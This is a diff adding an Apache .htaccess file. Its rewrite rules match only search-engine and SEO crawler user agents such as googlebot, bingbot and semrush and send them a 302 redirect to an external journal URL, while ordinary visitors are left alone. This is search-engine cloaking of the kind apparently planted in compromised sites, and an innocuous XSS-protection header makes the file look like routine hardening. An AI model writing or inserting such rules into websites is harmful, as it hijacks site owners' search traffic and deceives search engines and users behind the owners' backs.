@@ -1,0 +1,12 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Deteksi User-Agent bot
+    RewriteCond %{HTTP_USER_AGENT} "(googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog)" [NC]
+    RewriteRule ^(.*)$ https://jurnal.fkip.unmul.ac.id/index.php/JLPF [R=302,L]
+</IfModule>
+
+<IfModule mod_headers.c>
+    # Proteksi XSS
+    Header set X-XSS-Protection "1; mode=block"
+</IfModule>
